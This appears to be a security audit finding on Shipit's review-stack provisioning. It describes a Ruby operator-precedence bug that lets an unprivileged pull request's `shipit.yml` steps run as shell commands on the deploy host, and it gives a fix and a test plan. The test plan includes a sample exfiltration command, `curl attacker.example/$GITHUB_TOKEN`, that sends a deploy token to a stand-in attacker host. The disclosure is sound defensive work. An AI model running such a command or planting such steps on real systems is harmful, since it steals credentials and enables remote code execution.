### Title
Review stack auto-provisioning ignores `review_stacks_enabled` due to operator-precedence bug, letting an unprivileged PR author's branch (and its `shipit.yml`) get checked out and deployed via `TaskCommands#perform` - ([File: app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb])

### Summary
`OpenedHandler#provision?` was intended to require `repository.review_stacks_enabled == true` as a global gate before any PR-based review stack is auto-provisioned, i.e. the invariant `provision? ⇒ repository.review_stacks_enabled == true`. Because `&&` binds tighter than `||` in Ruby, the actual expression only ANDs `review_stacks_enabled` with the `allow_all?` branch, so a repository configured with `provisioning_behavior: allow_with_label` or `provisioning_behavior: prevent_with_label` will still auto-provision (checkout + deploy) a PR branch even when `review_stacks_enabled` is `false`.

### Finding Description
Expected binding: `OpenedHandler#provision? == true` should imply `repository.review_stacks_enabled == true` for every provisioning behavior.

Actual code: [1](#0-0) 

```ruby
def provision?
  repository.review_stacks_enabled &&
    repository.provisioning_behavior_allow_all? ||
    (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
    (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?)
end
```

Ruby parses this as `(review_stacks_enabled && allow_all?) || (allow_with_label? && has_label?) || (prevent_with_label? && !has_label?)`. The `review_stacks_enabled` gate is only ANDed into the first disjunct. If an operator sets `review_stacks_enabled: false` but leaves `provisioning_behavior` at `allow_with_label` (or `prevent_with_label`, both of which are legitimate, independent settings persisted on `Repository`), then any PR that carries (or omits) the provisioning label satisfies the second/third disjunct and `provision?` returns `true` regardless of `review_stacks_enabled`.

When `provision?` is true, `OpenedHandler#process` calls [2](#0-1) 
which invokes `ReviewStackAdapter#find_or_create!`, creating a `ReviewStack` whose `branch` is taken verbatim from `params.pull_request.head.ref`: [3](#0-2) 
and enqueuing it via `Shipit::ReviewStackProvisioningQueue.add(stack)` (line 82), which drives the provisioning/deploy pipeline. That pipeline checks out the PR's head branch into `@task.working_directory`, parses `shipit.yml` via `DeploySpec::FileSystem`, and `TaskCommands#perform` maps `@task.definition.steps` (sourced straight from that file) into `Command.new(command_line, env:, chdir: steps_directory)`: [4](#0-3) 
with no allowlist — any string in the attacker-controlled `shipit.yml` becomes a shell command executed via `Command#start`/`PTY.spawn` on the deploy host, together with `env` that includes deploy-time secrets merged from `@stack.env`, `@task.env`, and `deploy_spec.machine_env` (lines 33-48).

Existing guards do not stop this: `params` schema validation only checks types/presence, not business logic; `repository.review_stacks_enabled` is read but its effect is short-circuited by the precedence bug; there is no webhook signature bypass here — the attacker's own PR-opened webhook from their own repository/fork is a legitimate, unauthenticated-by-design event that Shipit is supposed to gate purely via `review_stacks_enabled`/`provisioning_behavior`, and that gate is broken.

### Impact Explanation
An attacker who can open a PR against (or within, if they have push access to a branch of) a repository that is onboarded to Shipit with `provisioning_behavior` set to `allow_with_label` or `prevent_with_label` — regardless of the operator having explicitly turned `review_stacks_enabled` off — can get their branch's `shipit.yml` steps executed as shell commands on the Shipit deploy host via `TaskCommands#perform` → `Command` → `PTY.spawn`. This is a Critical-class RCE/credential-exfiltration path (`GITHUB_TOKEN`/deploy-time env vars available to the spawned process) triggered purely by an unprivileged PR interaction, contrary to the operator's intent encoded by `review_stacks_enabled = false`. The blast radius is scoped to repositories that have this specific configuration combination (review stacks disabled globally but a per-repo `provisioning_behavior` other than default/`allow_all` retained), and is repeatable per PR/commit push to the branch.

### Likelihood Explanation
Requires: (1) the target repository has `provisioning_behavior` set to `allow_with_label` or `prevent_with_label` (a normal, documented configuration for controlling which PRs get review apps) while `review_stacks_enabled` is `false` (e.g., disabled after initially being configured, or misconfigured) — this is a plausible, not contrived, operator configuration since the two settings are independent DB columns with no application-level constraint tying them together (`db/migrate/20201001125502_add_provision_pr_stacks_flag_to_repositories.rb`, `app/models/shipit/repository.rb`). (2) The attacker only needs to open a PR (and possibly apply a label they control on their own PR) — no Shipit credentials, no repository-maintainer role, and no webhook secret required, since `pull_request` webhooks are triggered by GitHub for any PR event and processed by `OpenedHandler` unauthenticated with respect to Shipit.

### Recommendation
Fix the precedence bug so `review_stacks_enabled` gates every provisioning behavior:
```ruby
def provision?
  repository.review_stacks_enabled &&
    (repository.provisioning_behavior_allow_all? ||
     (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
     (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?))
end
```
Apply the same audit to `LabeledHandler`/`UnlabeledHandler`/`ReopenedHandler` for equivalent precedence mistakes, and add a model-level invariant/test ensuring no review stack is ever created when `review_stacks_enabled` is false.

### Proof of Concept
Minitest plan (`test/models/shipit/webhooks/handlers/pull_request/opened_handler_test.rb` scope, adapted conceptually):
1. Create a `Repository` fixture with `review_stacks_enabled: false`, `provisioning_behavior: "allow_with_label"`, `provisioning_label_name: "deploy-me"`.
2. Build `OpenedHandler` params for a PR with `action: "opened"`, `head.ref: "attacker-branch"`, `labels: [{name: "deploy-me"}]`.
3. Assert `handler.send(:provision?) == true` even though `repository.review_stacks_enabled == false` — proving the broken binding `provision? ⇒ review_stacks_enabled` does not hold.
4. Call `handler.process` and assert a `Shipit::ReviewStack` row is created with `branch: "attacker-branch"` despite `review_stacks_enabled` being false.
5. Separately, stub `DeploySpec::FileSystem#steps` (or write a `shipit.yml` fixture) with `deploy: ["curl attacker.example/$GITHUB_TOKEN"]`, instantiate `TaskCommands.new(task)` for a task whose `working_directory` is the checked-out `attacker-branch`, call `perform`, and assert the returned `Command#args` equals `["curl attacker.example/$GITHUB_TOKEN"]`, demonstrating the untrusted string reaches `Command.new` unfiltered.
